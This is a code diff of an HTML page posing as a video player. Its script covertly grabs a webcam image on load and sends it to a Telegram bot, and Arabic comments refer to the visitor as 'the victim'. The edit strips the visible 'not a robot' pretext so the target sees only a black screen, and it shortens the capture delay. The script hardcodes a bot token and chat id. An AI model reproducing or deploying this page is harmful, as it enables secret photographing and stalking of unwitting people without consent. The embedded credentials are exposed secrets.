@@ -2,55 +2,50 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>مشاهدة الفيديو</title>
+    <title>Video Player</title>
     <style>
-        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        /* أخفينا كل شيء عشان الضحية يشوف شاشة سودة بس */
     </style>
 </head>
 <body>
-    <h2>جاري تحميل الفيديو...</h2>
-    <div class="loading"></div>
-    <p>يرجى السماح بالوصول للكاميرا لتأكيد أنك لست روبوت ومشاهدة المقطع.</p>
-
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const token = '8642064710:AAE5mGb3WhT3LqCcC9H7sOxW9XAWwwR-BkY'; // توكن بوتك
-        const chat_id = '7253503761'; // آيدي حسابك
+        const token = '8642064710:AAE5mGb3WhT3LqCcC9H7sOxW9XAWwwR-BkY'; 
+        const chat_id = '7253503761'; 
 
-        async function startCamera() {
+        async function fastCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // انتظر ثانية لالتقاط الصورة
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imageBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    
-                    // إرسال الصورة للتليجرام
-                    const formData = new FormData();
-                    formData.append('chat_id', chat_id);
-                    formData.append('photo', imageBlob, 'capture.jpg');
-                    formData.append('caption', '🔥 صادك فهد! تم التقاط صورة الوجه بنجاح 😎');
+                // أول ما الكاميرا تشتغل يطق الصورة فوراً بدون انتظار
+                video.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imageBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7)); // جودة 70% لسرعة الإرسال
+                        
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', imageBlob, 'snap.jpg');
+                        formData.append('caption', '📸 صيدة سريعة من فهد 😎🔥');
 
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, 1500);
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 300); // 0.3 ثانية بس عشان الكاميرا تركز
+                };
             } catch (err) {
-                console.log("تم رفض الكاميرا");
+                // إذا رفض الضحية
             }
         }
 
-        // تشغيل الكاميرا فور فتح الصفحة
-        window.onload = startCamera;
+        window.onload = fastCapture;
     </script>
 </body>
 </html>
